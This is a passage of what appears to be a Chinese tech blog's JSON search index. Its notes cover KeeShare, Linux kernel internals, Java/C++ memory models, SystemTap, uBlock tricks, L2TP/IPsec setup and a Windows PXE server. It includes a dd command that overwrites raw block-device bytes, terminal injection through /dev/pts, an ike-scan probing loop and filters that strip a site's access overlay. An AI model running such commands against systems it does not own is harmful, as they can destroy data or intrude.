$conf_path\nKeeShare\n這個功能就是我想跳回來的其中一個理由\nKeeShare就像分割db，可以選某個folder給別人看或改\n使用步驟\n\n先開keepassxc的keeshare讓他可以讀與寫keeshare的檔案 (只要設定一次)\n到需要分出去的folder點編輯群組\n到keeshare，選匯出(只寫出去)或同步(寫出去也接收其他的新增)，存keeshare的檔案\n開一個新的db檔，創一個folder\n到keeshare，選匯入(只收來自source的更改)或同步(寫出去也接收其他的新增)\n如果選同步可以在新的db寫一個entry，去存，之後到原本的db去看，會看到新的entry\n\nRef\nAutomatic Database Opening\nDatabase Sharing with KeeShare\nHow to store and read user credentials from Windows Credentials manager\n","categories":["Utils","Keepass"]},{"title":"圖解linux核心工作原理整理","url":"/2021/06/linux-kernel-work-principle-reading/","content":"動機\n都買了就讀一下\n\nch1\n\ncpu至少有兩種模式\n\nuser mode\nkernel mode: 可以access所有記憶體\n\n\n\nch2\n\nsys call\n\n目的: 讓user space的proc調用kernel space的功能，以操作或取得底層的資源\n\n用eval+apply的interp的角度去看，sys call就像primitive opertor\nproc, mem, file, IPC, network, IO, time, …\n過程:\n\n塞sys call的編號到reg\n發中斷(trap)\ncpu切到kernel mode\n請cpu跑sys call\ncpu根據sys call的數字去看表\ncpu跑kernel寫好的對應的handler\n丟return 值，轉回去user mode\n\n\n一些指令\n\nsar -P ALL 1: (mpstat) 可以看cpu的load\n\nuser% + nice%: cpu是執行在user space的時間佔比\n\nuser%: 就是一般的proc跑的\nnice%: 有被調過nice有特權的proc所跑的時間\n\n\nsys%: cpu是執行在kernel space的時間佔比，也就是跑sys call的時間\n\n\nstrace -T: 顯示proc所執行的每個sys call與花了多少時間\nldd: 看exe有link到哪些lib\n\n\n\n\n\n\n\nch3\n\nfork, execve: skip here\nexe info\n\nexe的結構有三個部分\n\ninfo: 在linux是elf，會有很多資訊但對exe的結構來說重要的是\n\n每個部份的\n\n起點addr (fake addr)\n長度\nmapping後的起點addr (real addr)\n\n\nentry point\n\n\ncode\ndata\n\n\n一些指令\n\nreadelf -S: 可以拿到起點addr與長度\ncat /proc/&lt;pid&gt;/maps: 可以看proc的memory mapping\n\n\n\n\n\nch4\n\nproc scheduler:\n\nround-robin\n\n1個cpu只會跑1個proc\n每個proc都享有相同的時間去分cpu(沒nice的話)\n\n有nice的proc分到的cpu時間會比較多\n\n\n\n\n在書中有一個程式是會fork多個proc(work load都一樣)去看分到的時間與執行狀況\n\n總執行時間隨fork出的proc變多而跟著上升\n因為throughput不變，故隨著proc數上升，proc的latency(end_time-start_time)也會上升\n\n\n多cpu時會把proc往最少proc的cpu塞\n一些指令\n\ntasklet -c &lt;cpuid&gt; &lt;cmd&gt;: 強制cmd跑在cpuid的cpu上\ntime ...\n\nproc state的變化大概像\n\nrun(a) | sleep | run(c) | sleep\n\n\nreal: end_time-start_time\nuser: user space\nsys: kernel space\n\nuser+sys就是把所有run時間加起來\n\n\n\n\n\n\n\n\nproc state\n\nexecuting\nwaiting\nsleeping\n\nD: wait IO\nS: wait signal\n\n\nzombie\n\n\n\nch5\n\nvirtual mem\n\npurpose:\n\nproc isolation\n\nC有ptr可以亂指，有virtual mem就指不出去\n不過如果沒有ptr是不是就可以不用virtual mem?\n\n\navoid mem fragment\nsupport of multiple procs\n\n\nimplement: page table\n\n可以當成一個存在於kernel的函數，all fake addr -&gt; all real addr\ndemang page: lazy evaluation\n\n直到proc寫入時kernel才去找一個real addr\nmalloc是從先拿到的mem pool中拿addr，但mmap是sys call就是直接拿\n\n\ntable太大了\n\n階層式page table\n\n從list變成tree，all fake addr -&gt; (another table OR all real addr)\n\n\nhuge page\n\n把page的單位變大，讓table的item數量變少\n\n\n\n\n\n\nfile mapping: 把file複製到mem操作，最後在適當的時候把對file的改動寫回去\ncopy-on-write: 在fork時parent與child proc共用相同的Page，當其中一方改動時才複製新的，並把fake addr指到新的page上\n\n在算proc使用的mem時會各自顯示所以佔有的mem，但是因為copy-on-write實際上的mem使用量沒那麼多\n\n\nswap\n\nswap-in: mem -&gt; swap(hdd)\nswap-out: mem &lt;- swap(hdd)\n持續 swap-in &amp; swap-out: thrashing\n\n\nVSS &amp; RSS\n\nfake mem usage &amp; real mem usage\n都有用完的機會，VSS是當table不夠時，RSS就是真的沒了\n\n\n\n\n一些指令\n\nfree\n\ntotal: 插了多少記憶體\nbuff: 緩衝快取 (使用緩衝記憶體的快取)\ncache: 分頁快取 (使用kernel space記憶體去快取file的快取)\navail: kernel space與user space的可以用的mem總和\n\n\n\n\n\nch6\n\ncache mem\n\n裡面就是一張表\n\nname\nval\nis_dirty\n\n\nlocalty: time &amp; space\n\n讓proc同一時間使用的mem越少越好\n\n\ntransition lookaside buffer\n\nproc取值要\n\n從fake addr換real addr\n從real addr換值 (有cache的機會)\n\n\n從fake addr換real addr是記憶體即便後面有cache主要的overhead還是吃在第一個\n所以多一個buffer來把fake addr換成val\n\n\n一些指令\n\n/sys/system/cpu/cpu&lt;i&gt;/cache/index&lt;j&gt;\n\ntype: data, code, unified\nshared_cpu_list\nsize: total mem\ncoherency_line_size: unit size\n\n\n\n\n\n\npage cache\n\n把file讀到kernel的mem去cahce\n\n所以在第一次之後的讀寫，不會每次都跑到HDD去(page in(HDD-&gt;mem)/out(mem-&gt;HDD)沒有上升)\n寫就會由kernel處理dirty的部分來做\n\n\n一些指令\n\nsar -d -p: HDD stat\nsat -B: page in/out\nsysctl vm.dirty_...\necho 3 &gt; /proc/sys/vm/drop_cache: remove all cache\n\n\n\n\nhyper thread\n\nproc state的變化大概像\n\nrun(a) | sleep | run(c) | sleep\n\n\n如果有多的reg的話可以在sleep時讓cpu當成一顆新的cpu去跑其他proc\n所以，hyper thread就是保留一部份reg(一半)，把cpu當成兩顆用\n\n\n\nch7\n\nfile system\n\n一定會有\n\nname\noffset\nlen\n\n是不是很熟悉?\n在exe info也有看過一樣的東西\n其實就是把會記憶的東西當成一條常常的帶子(圖靈機)\n但這樣不會有問題嗎?\n\n\n\n\n特性\n\n是一顆tree (從root開始)\n有data與metadata\n\n權限\nfile size\ntimestamp\n\n\nquota\n\nuser, folder, sub-disk(brtfs)\n\n\n\n\ninconsistent\n\n從a的link改成b的link\n\n加一條到b的link\n把原本的a的link刪掉 (在這裡斷電)\n\n\nsol\n\n日誌\n\n在做事前先寫下步驟，在一步一步做\n\n寫完步驟前出事 =&gt; old tree\n做到一半出事 =&gt; redo, new tree\n\n\n\n\ncopy-on-write (persistent data structrue)\n\n每次的新增都是用新的位置\n\n做到一半出事 =&gt; old tree\n\n\n\n\nfsck\n\n找出inconsistent做處理\n\n像在加一條到b的link出事會出現兩條link\n這是可以選擇砍其中一條或是兩條都砍\n\n\n\n\n\n\n\n\n\n\ndevice file\n\ntype\n\ncharacter\n\n沒有seek，也就是沒有隨機讀取\n可以寫字元與讀字元\n用ps可以看到bash的/dev/pts/&lt;n&gt;\n\n可以用echo &lt;cmd&gt; &gt; /dev/pts/&lt;n&gt;與# &lt;cmd&gt;一樣\n\n\n\n\nblock\n\n可以當成記憶體\n用mount\n\n額外提一個mount --bind olddir newdir\n這是把現有的folder連到另一個folder去，olddir的path依舊，但內容是newdir\n可以用在olddir無法改變屬性時\n\n\nstrings -t -x可以把block dev的資料用string倒出來with addr\n\n所以可以配合dd if=override_file of=/dev/sda1 seek=$((&lt;addr&gt;)) bs=1來改寫檔案內容\n\n\n\n\n\n\n\n\n其他fs\n\nbrtfs 大約等於 lvm+ext4\nprocfs\n\n/proc/&lt;pid&gt;\n\nmaps\ncmdline\nstat\n\n\n/proc\n\ncpuinfo, diskstat, meminfo\n\n\n/proc/sys/\n\nsysctl\n\n\n\n\nsysfs\n\n/sys\n\ndevices\nfs\n\n\n\n\ntmpfs, cgroupfs, nfs\n\n\n\nch8\n\nHDD\n\n轉動很慢\n\nIO scheduler: 在把req送到driver前\n\nmerge: 一次讀多一點\nsort: 變成seq讀取\n\n\npreread: 順便把其他的附近的也一起讀出來\n\n\n\n\nSSD\n\n隨著IO單位數的上升\n\nthroughput上升\nIO scheduler的增益越來越不明顯，甚至損害效能\n\n\n\n\n結論\n\n一次讀多一點，資料量大沒關係\n次數越少越好\n在HDD與SSD，seq去讀寫的效能都是最好的，資料最好存在連續的區塊\n\n\n\n","categories":["System","Linux","Reading"]},{"title":"記憶體模型筆記","url":"/2021/06/mem-models/","content":"動機\n之前看完linux kernel的同步方式，對同步有新的理解，可以重新面對這個話題了\n\n原子性、可見性\n\n原子性: 全都完成，不然就是根本沒做\n\nrace condition\nprimitive有可能不是atomic\n\njava的long與double就不是\n\n大部分arch可以讓32bit的資料atomic\n但long與double不是阿\n就可能要分兩次，這樣就出事了\n\n\nC++的atomic類別\n\nC++支援struct，但是struct的大小不一定\n如果有align那好說，但是如果沒有compiler就要自己動手腳(好麻煩)\n\n\nWord Tearing\n\n更新相鄰的資料時，會影響到隔壁!?\n像boolean在java是1byte!\n\n這與arch能處理的最小單位有關，大部分arch是8bits\n所以要更新就要一次跑1byte\n\n\n可以同時跑2個thread做java的BitSet(可以想成byte[])set\n\n可能只更新其中一位或是兩位都更新\n因為是做bitwise，所以是一次更新1byte\n\n\n\n\n\n\n\n\n可見性: 在後面的指令能看到前面的影響\n\nreorder與亂序執行\n\n不同arch的reorder規則\n\n強(只准store-load): x86, sparc-tso\n弱(LL,LS,SS,SL都可): powerpc, ia64, arm\n\n\n資料相依\n\nwrite-read, write-write, read-write\n這在任何arch都不會被reorder，但僅限single thread的scope\n\nsmp與multi-thread之間沒有 (所以需要後面的規則)\n\n\n\n\n\n\ncache\n\n\n順序性: 前面跑完才能跑後面\n\nreorder是會保證single thread中的code與reorder前跑出來的結果是一樣的\n\n\n\njava memory model\nhappen-before(hb)\n在放在A指令之前的指令所做出的改變，A指令一定看的到\n\n同一個scope中具有順序性\n\n在同一thread中，前一條指令對後一條指令是happen-before\n前一個synchronized的解鎖，對後一個synchronized的加鎖是happen-before\n\n\n先寫後讀 (先啟動後執行)\n\n一個volatile的寫，對後續任何volatile的讀是happen-before\nthread的start，對該thread的所有指令是happen-before\nthread的interrupt，對所有檢查interrupt的指令是happen-before\nthread的join，對所有檢查thread存活的指令是happen-before\nobj初始化，對obj的finalize是happen-before\n\n\nA hb B，且B hb C，則A hb C\n\ncausality (因果關係)\n下面是無中生有(out-of-thin-air)的其中一種例子\nfoo被reorder成foo2，就happen-before而言，這沒錯，但執行下去就出事\n// x == y == 0void foo()&#123;  r1=x;  if(r1 != 0)    y=42;&#125;/*void foo2()&#123;  y=42;  r1=x;  if(r1 != 0)    y=0;&#125;*/​void bar()&#123;  r2 = y;  if(r2 != 0)     x=42;&#125;// r1==r2==42?\n為了防止這種事發生，才有causality檢查\n根據\n\n控制流\n資料相依\n\n去看執行結果會不會有奇怪的東西\n關於如何檢查，我看了好久還是不太懂，在ref有範例，等PLT的功力回來再說吧\n實際上的做法是\n\n保持原子性\n\n\nvolatile (++是複合動作，要注意)\n\n原本volatile只是確保取值都從mem拿，確保可見性\n但java memory model保證volatile讀寫比較不會被reorder，進而保證了原子性(只有一寫對一個以上的讀才有!!)\n\n但沒有mutual exclusion，所以如果很多thread一起攻擊的話就會出事，可以看下面的code\n\n\n\n\nsynchronized\n\n\n上barrier與禁止reorder，保持可見性與順序性\n\njava的volatile\n一個加一個減，照理來說要是0\npublic class Main &#123;    public static volatile int race = 0;    private static final int INCREASE_COUNT = 10000;        public static void main (String[] args) &#123;        Thread[] threads = new Thread[2];        System.out.println(System.currentTimeMillis());        threads[0] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        race++;                    &#125;                &#125;            &#125;);        threads[1] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        race--;                    &#125;                &#125;            &#125;);        threads[0].start();        threads[1].start();        while (Thread.activeCount() &gt; 1) &#123;             Thread.yield();        &#125;        System.out.println(System.currentTimeMillis());        System.out.println(race);    &#125;&#125;\nvolatile的happen-before是寫之後可以被所有讀看到，但是剛剛是一個讀前面有一堆寫\n要處理這件事就是加個條件，在不符合條件時就不做事，確保只有一個寫\npublic class Main &#123;    public static volatile int race = 0;    private static final int INCREASE_COUNT = 10000000;        public static void main (String[] args) &#123;        Thread[] threads = new Thread[2];        System.out.println(System.currentTimeMillis());        threads[0] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        if (race &lt;= 0) &#123;                            race++;                        &#125; else &#123;                            i--;                        &#125;                    &#125;                &#125;            &#125;);        threads[1] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        if (race &gt; 0) &#123;                            race--;                        &#125; else &#123;                            i--;                        &#125;                    &#125;                &#125;            &#125;);        threads[0].start();        threads[1].start();        while (Thread.activeCount() &gt; 1) &#123;             Thread.yield();        &#125;        System.out.println(System.currentTimeMillis());        System.out.println(race);    &#125;&#125;\n所以如果真的需要就是用AtomicInteger，同時我用jdoodle去跑明顯這個比較快\n因為不是每次的loop都會做事，可能有不做事的時候，導致時間的浪費\nimport java.util.concurrent.atomic.AtomicInteger;public class Main &#123;    public static AtomicInteger race = new AtomicInteger();    private static final int INCREASE_COUNT = 10000000;        public static void main (String[] args) &#123;        Thread[] threads = new Thread[2];        System.out.println(System.currentTimeMillis());        threads[0] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        race.incrementAndGet();                    &#125;                &#125;            &#125;);        threads[1] = new Thread(new Runnable() &#123;                @Override                public void run () &#123;                    for (int i = 0; i &lt; INCREASE_COUNT; i++) &#123;                        race.decrementAndGet();                    &#125;                &#125;            &#125;);        threads[0].start();        threads[1].start();        while (Thread.activeCount() &gt; 1) &#123;             Thread.yield();        &#125;        System.out.println(System.currentTimeMillis());        System.out.println(race);    &#125;&#125;\n建到一半的物件\nDouble-Checked Locking\n用在multi-thread生singlton，但是會出事\nclass Foo &#123;    private Helper helper = null;    public Helper getHelper() &#123;        if (helper == null) &#123;            synchronized(this) &#123;                if (helper == null)                    helper = new Helper();            &#125;        &#125;        return helper;    &#125;&#125;\n在設定helper的值時，可以reorder成\n\n先給ref\n之後init物件\n\n但拿到ref就會讓if過，最後有人會拿到建到一半的物件\n其中一個解法是volatile，因為不會reorder\nclass Foo &#123;    private volatile Helper helper = null;    public Helper getHelper() &#123;        if (helper == null) &#123;            synchronized(this) &#123;                if (helper == null)                    helper = new Helper();            &#125;        &#125;        return helper;    &#125;&#125;\n另一個解法是static的field，class初始化完static要存在可以利用這個特點\nprivate static class LazyFooHolder &#123;  public static Foo foo = new Foo();&#125;public static Foo getInstance() &#123;  return LazyFooHolder.foo;&#125;\nfinal field\njava memory model保證任何access final的thread會看到freeze後的資料\n中間是藉由禁reorder(freeze不能在設值前發生，access不能再freeze前發生)\n但有趣的是，如果把this傳出去就不一定了\nObj1 obj = new Obj1();final_field = 42;ptr1 = this;//freeze final_fieldptr2 = this;\n如果有thread看到ptr1，就直接去用，這樣就無法保證一定看的到final_field，因為設定ptr的指令可能被reorder，最後ptr1拿到的就是建到一半的物件(連final都還沒跑完)\ncpp memory model\n基本就是基於java memory model，但多了可以控制atomic的memory barrier可以寬到哪邊去\n介紹memory barrier\n就是控制reorder不要讓指令跑過barrier\n而指令可以分成Load或Store，所以有四種case\n\nLoadStore\nLoadLoad\n\nLoadLoad + LoadStore組成Acquire semantics\njava的volatile的寫與cpp的memory_order_acquire\n\n\nStoreStore\n\nStoreStore + LoadStore組成Release semantics\njava的volatile的讀與cpp的memory_order_release\n\n\nStoreLoad\n\n只有這個是強與弱memory model都可以reorder的，所以call這個一定會有事發生\n\n\n\nbarrier有cpu版與compiler版，效力自然是cpu比較大\nmemory_order\n\nmemory_order_relaxed\n\n就是沒有barrier，只剩下原子性\n\n\nmemory_order_acquire\n\n在這點之後的所有write與自己的read不會超過這裡\n可以想成是第一個write，然後後面有很多其他write與自己的read\n更形象一點可以想成上蓋\n對應到java的volatile寫\n\n\nmemory_order_consume\n\n與memory_order_acquire很像\n但是只限制與目前變數有關的write不超過這邊\n\n\nmemory_order_release\n\n在這點之後的所有write與自己的read不會超過這裡\n可以想成是最後一個read，然後前面有很多其他write與自己的read\n更形象一點可以想成下底\n對應到java的volatile讀\n\n\nmemory_order_acq_rel\n\nacquire + release\n這感覺就很像楚河漢界，上半部與下半部不會混在一起\n\n\nmemory_order_seq_cst\n\n就是java的volatile，照順序來\n\n\n\n臨時追加: ABA問題\n主要是在lock-free才會提到，因為會看修改前與修改後沒有內容是不是沒被動過，但是如果只是看起來沒被動過?\nABA問題有三個條件\n\n重複讀某變數，同時只用此變數做condtion\n每次讀與寫都沒有同步\n被多個thread修改，值有可能變回去以前的某一個值\n\n如何處理\n加入一個變數，只能單調遞增\n在做cond時除了看原本的變數，這個單調遞增的變數也要看\n轉帳問題\n1. 小琳在 ATM 1 转账 100 块钱给小李；2. 由于ATM 1 出现了网络拥塞的原因卡住了，这时候小琳跑到旁边的 ATM 2 再次操作转账；(有兩次轉帳)3. ATM 2 没让小琳失望，执行了 CAS(100,0)，很痛快地完成了转账，此时小琳的账户余额为 0；(第一次轉帳)4. 小王这时候又给小琳账上转了 100，此时小琳账上余额为 100；5. 这时候 ATM 1 网络恢复，继续执行 CAS(100,0)，居然执行成功了，小琳账户上余额又变为了 0；(第二次轉帳)6. 这时候小王微信跟小琳说转了 100 过去，是否收到呢？小琳去查了下账，摇了摇头，那么问题来了，钱去了哪呢？\nRef\nThe Java Memory Model(這個有因果關係檢查的範例)\nJava Memory Model Pragmatics(人性化很多，適合第一次看)\nJSR-133 Review(中文的，解釋得很好)\n对优化说不 - Linux中的Barrier\nABA problem\n","categories":["System","Parallel"]},{"title":"systemtap使用筆記","url":"/2021/06/systemtap-tutorial/","content":"動機\n受不了只能一直放printf與printk來猜到底哪裡錯的日子，所以來看看systemtap\n發現他真的很強!!\n\nsystemtap\n\n\nprobe\n\nscript -&gt; C -&gt; kernel module\n基本就是probe &lt;event&gt; &#123; &lt;handler&gt; &#125;\nevent: what-to-traced-type.suffix1.suffix2....\n\n起點與終點\n\nbegin\nend\nerror\n\n\n同步\n\nkernel &amp; module(mpat) &amp; process(pmat) &amp; syscall\n\nmpat: 放lib的名字，支援*,[],?等wildcard\npmat: pid | &quot;path-to-proc&quot;\nprocess還可以\n\nthread: 看生出來的thread\n\nbegin\nend\n\n\n接下面的function, statement\n\n\nsyscall的用法: syscall(num) 或 syscall.name 或 syscall.*\nsyscall提供4個變數: argstr, name, retvat, retstr\n\nfunction(pat) : 函數\n\npat: function-name[@source-path[&#123;:line-number|:first-line-last-line|+relative-line-number&#125;]] | *\nexported\ncallee\ncallees\n\n\nstatement(pat) : 其中的code\n\nnearest\n\n\n可以指定觸發的時機\n\ncall\nreturn\ninline\n省略就是 call+inline\n\n\n在handler中可以看source code中的變數(context(target) variable)\n\n$var\n@var(“varname@src/file.c”)\n\n這個能access到extern或是不在scope中的變數\n\n\nderef\n\n$var-&gt;a\n$var[0]\n\n\ncheck cxt var exists\n\n@defined(expr)\n\n\npretty-print\n\n$$var\n\n\nprint struct\n\n$var$\nnested: $var$$\n\n\ncast (如果struct在不同地方)\n\n@cast(tv, “timeval”, “&lt;sys/time.h&gt;”)-&gt;tvsec\ntmp = &amp;@cast(tv, “timeval”, “&lt;sys/time.h&gt;”)[0]; tmp-&gt;tvsec\n\n\n\n\n\n\n\n\n沒有DWARF(debug訊息)\n\nkprobe\n\nmodule(mpat)\nfuntion &amp; statement\nfunction與module不能用wildcard\n\n\nnd_syscall\n\n\n\n\n異步\n\ntimer\n\nms\njiffies\nprofile\n\n週期性的在每顆cpu上發作\n\n\n\n\n\n\n略過\n\nprocfs: 在systemtap的/proc/systemtap/mod-name/中創檔案\njava: 能看java\ninput: 能吃stdin\nnetfilter: 看netfilter\nperf: 看perf event\npython: 看python\n還有硬體追蹤的功能，去man stapprobes看看吧\n\n\n\n\nhandler\n\nfunction:\n\nbuildin\n\ntid, pid\nexecname: 現在跑的proc name\ncpu: cpuid\ngettimeofday_s\npp: probe目前的位置(配合pat有wildcard時可以印code檔名與行數與函數名)\nppfunc: 被probe的func name\nprint_backtrace: kernel stack\nprint_ubacktrace: userspace stack\nthread_indent: 會根據stack深度噴indent\nexit\n所有builtin\n\n\n自訂\n\nfunction func_name(var, ...) &#123;&#125;\n\n\nembedded c\n\nfunction func_name(var:type, ...):type %&#123; ... %&#125;\n如果要取systemtap的變數要\n\n參數: STAP_ARG_varname\n全域: STAP_GLOBAL_GET_varname()\n\n怎麼set\n\n一般: STAP_GLOBAL_SET_varname(val)\narray: STAP_GLOBAL_SET_varname(key1,...,val)\n\n\nc的code要加\n\n /* pragma:read:varname */ /* pragma:write:varname */\n\n\n\n\n\n\nreturn時要注意，使用特別語法\n\nSTAP_RETURN(expr)\nSTAP_RETVALUE = expr\n\n\n目前看到的type\n\n數字: long\n字串: string\n\n\n\n\n\n\ncontroll structrue\n\nif (expr) ... else ...\nwhile (expr) ...\nfor (A;B;C) ...\ncomment: #, //, /**/\nstr concan: strA . strB\nvar\n\ntype: numder, string\nvar = expr\nscope: block, global\n\nglobal will be auto lock&amp;unlock\nglobal: global &lt;name&gt;\n\n\n\n\n\n\ndata structrue\n\narray: 其實是hash，只能global\n\nforeach (VALUE = [KEY1, KEY2, …] in ARRAY) STMT\ndelete array[KEY1, KEY2, …]\nif ([KEY1, KEY2, …] in array) ...\n\n\naggregate: 這是set&lt;int&gt;，只能用systemtap提供的函數來操作\n\nappend: a &lt;&lt;&lt; &lt;number&gt;\n@avg(a) @count(a) @hist_linear @hist_log\n\n\n\n\n\n\nexample: probe kernel.function(&quot;*@net/socket.c&quot;) &#123; &#125;\n\nman stapex\n\n\nsystemtap’s module: tapset\n\n與CSS一樣，後面會override前面\n\n\nProbe point aliases\n\nprobe的wrapper，或是叫decorator，用python的話來說\nprobe name.suffix = probe, probe.... &#123; .. &#125;\n後面就是把name.suffix當成一般的probe，但會先跑handler他handler的東西\n\n\nstap 參數\n\n-l PROBE: List matching probes.\n-L PROBE: List matching probes and local variables.\n\n據說可以用這個追函數的實際地點(像用wildcard會把所有相關的列出來)\n但我在我ubuntuVM上都出不來啊\n還有ubuntu 20.04上的systemtap不能從apt裝，動不了\n\n\n-g: guru mode(如果要用embed c的話)\n\n\nall man\n\nRef\n短短的tutorial 讚\n其他大大的筆記\nsystemtap的使用技巧 感覺值得深入去看\n\n\n","categories":["System","Performance"]},{"title":"ublock origin的小用法","url":"/2021/06/ublock-origin-tips/","content":"動機\nublock origin不只是adblock\n\n在firefox android上disable javascript\n在android的firefox中沒有停用javascript的選項，但是他可以裝ublock origin，所以可以到ublock origin中把javascript關掉\n考滿分的unblock\n考滿分的阻擋是用css，一般adblock只能擋元素，但ublock可以改css\ntoefl.kmf.com##.js-shield-box.shield-boxtoefl.kmf.com##.blur:style(filter: none !important)\n改網站的javascript\nublock origin可以改javascript的變數等等，但是只限定用ublock origin已經設定好的功能\n如果要用自己的js也是可以看這邊\n","categories":["Utils","Userscript"]},{"title":"ubuntu上用l2tp+ipsec","url":"/2021/06/ubuntu-l2tp-vpn/","content":"動機\n在ubuntu上用l2tp+ipsec其實有點麻煩，所以紀錄一下\n\nSteps\n\n裝network-manager-l2tp與network-manager-l2tp-gnome\n點加入後填server ip, 帳密\n\n\n\n\n\n改IPsec settings\n\n\n\n\n\n填Phase1 Algorithm\n填Phase2 Algorithm\n\n\naes256-sha1,aes128-sha1,3des-sha1\n\n\n都按ok後，連線\n\n找Phase1 Algorithm\n這個不對ipsec就建不起來，所以要去看server吃什麼ipsec\n\n裝ike-scan\n跑腳本\n\n\nsudo ipsec stop &amp;&amp; sudo ./ike-scan.sh &lt;vpn server addr&gt; | grep SA=\n\n#!/bin/sh# Encryption algorithms: 3des=5, aes128=7/128, aes192=7/192, aes256=7/256ENCLIST=&quot;5 7/128 7/192 7/256&quot;# Hash algorithms: md5=1, sha1=2, sha256=5, sha384=6, sha512=7HASHLIST=&quot;1 2 5 6 7&quot;# Diffie-Hellman groups: 1, 2, 5, 14, 15, 19, 20, 21GROUPLIST=&quot;1 2 5 14 15 19 20 21&quot;# Authentication method: Preshared Key=1, RSA signatures=3AUTHLIST=&quot;1 3&quot;for ENC in $ENCLIST; do   for HASH in $HASHLIST; do       for GROUP in $GROUPLIST; do          for AUTH in $AUTHLIST; do             echo ike-scan --trans=$ENC,$HASH,$AUTH,$GROUP -M &quot;$@&quot;             ike-scan --trans=$ENC,$HASH,$AUTH,$GROUP -M &quot;$@&quot;          done      done   donedone\n\n會出現這樣的東西，這些就是server支援的Algorithm\n\n\n\n\n\n挑一個填像到3des-md5-modp1024!到Phase1 Algorithm中\n\n\n也可以添多個，加逗號像3des-md5-modp2048,3des-md5-modp1024!\n\nRef\nWhat could make ike-scan see an IP that is an L2TP/IPSEC VPN show up like a non-IPSEC VPN?\nNetworkManager-l2tp\n","categories":["System","Linux","Tips"]},{"title":"windows上用win10的pxe檔案與架pxe server","url":"/2021/06/windows-pxe/","content":"動機\n我找不到我的隨身碟，剩下的sd卡也掉到某個床縫中，暫時拿不到\n只好來研究怎麼用網路來裝OS了\n原本用serva，好不容易用完，開機之後發現帳密不管怎麼打都不對，就只好自立自強了\n\nPXE需要?\n\nDHCP server\n\n發IP\n教PXE cilent要載什麼檔案\n\n\nTFTP server\n\nembed中常用的file transfer protocol\n\n\n\n這裡是用TFTPD64\n網路topo\nPXE server &lt;=&gt; L2 switch &lt;=&gt; 要被裝的電腦\n怎麼搞PXE\n取得WinPE\n\n下載Windows ADK\n\n\n下載適用於 Windows 10 版本 2004 的 Windows ADK\n\n選部署工具就可以了\n\n\n下載適用於 ADK 版本 2004 的 Windows PE 附加元件\n\n\n把winpe抽出來，這裡拉amd64\n\n\ncopype.cmd amd64 C:\\winpe_amd64\n\n\n做pxe需要的資料夾，這裡需要\n\n\nwinpe的PXE 開機檔案\n\n把winpe掛載上去，\n\n\nDism /mount-image /imagefile:c:\\winpe_amd64\\media\\sources\\boot.wim /index:1 /mountdir:C:\\winpe_amd64\\mount\n\n\ncopy PXE 開機檔案\n\n\ncopy c:\\winpe_amd64\\mount\\windows\\boot\\pxe\\*.* c:\\tftproot\\Boot\n\n\nboot.sdi\n\ncopy C:\\winpe_amd64\\media\\boot\\boot.sdi c:\\tftproot\\Boot\n\n\nboot.wim\n\ncopy C:\\winpe_amd64\\media\\sources\\boot.wim c:\\tftproot\\Boot\n\n\n字型\n\ncopy C:\\winpe_amd64\\media\\Boot\\Fonts c:\\tftproot\\Boot\\Fonts\n\n\nBCD(bootloader)\n\n生BCD檔\n\n\nbcdedit /createstore c:\\BCD\nbcdedit /store c:\\BCD /create &#123;ramdiskoptions&#125; /d &quot;Ramdisk options&quot;\nbcdedit /store c:\\BCD /set &#123;ramdiskoptions&#125; ramdisksdidevice boot\nbcdedit /store c:\\BCD /set &#123;ramdiskoptions&#125; ramdisksdipath \\Boot\\boot.sdi\n\n這裡的root就是tftp的root\n\n\nbcdedit /store c:\\BCD /create /d &quot;winpe boot image&quot; /application osloader\n\n\n把剛剛的GUID複製下來\n設定BCD\n\n\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; device ramdisk=[boot]\\Boot\\boot.wim,&#123;ramdiskoptions&#125;\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; path \\windows\\system32\\winload.exe\n\n這個是boot.wim裡面的path，但要注意是用BIOS還是UEFI\nwinload.exe會用BIOS\nwinload.efi會用UEFI\n\n\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; osdevice ramdisk=[boot]\\Boot\\boot.wim,&#123;ramdiskoptions&#125;\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; systemroot \\windows\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; detecthal Yes\nbcdedit /store c:\\BCD /set &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; winpe Yes\nbcdedit /store c:\\BCD /create &#123;bootmgr&#125; /d &quot;boot manager&quot;\nbcdedit /store c:\\BCD /set &#123;bootmgr&#125; timeout 30 \nbcdedit /store c:\\BCD -displayorder &#123;18baf49f-d429-11eb-b837-000c299a782c&#125; -addlast\n\n\ncopy BCD\n\n\ncopy c:\\BCD c:\\tftproot\\Boot\n\n\n\n\n(Optional) 如果要用UEFI，要複製bootmgfw.efi\n\n\ncopy C:\\winpe_amd64\\mount\\Windows\\Boot\\EFI\\bootmgfw.efi c:\\tftproot\\Boot\n\n自定義winpe啟動腳本\n改Windows\\System32\\startnet.cmd，所以用剛剛的例子路徑是\nc:\\winpe_amd64\\mount\\Windows\\System32\\startnet.cmd\n這裡直接把iso透過smbda掛上去，再call setup.exe\nnet use Z: \\\\192.168.123.1\\TFTPRoot\\iso iso /user:192.168.123.1\\isoZ:setup.exe\n改完要寫回去boot.wim\nDism /Unmount-Image /MountDir:&quot;C:\\WinPE_amd64\\mount&quot; /commit\nnet use一直出事\n\n一個是net use的問題，我試了好幾次最後試出來是上面那樣\nwindows的網路權限問題\n\n\n按Win + R輸入secpol.msc\nLocal Policies -&gt; Security Options\n裡面找Network Security: LAN Manager authentication level\n換成LM and NTLM – use NTLMv2 session security if 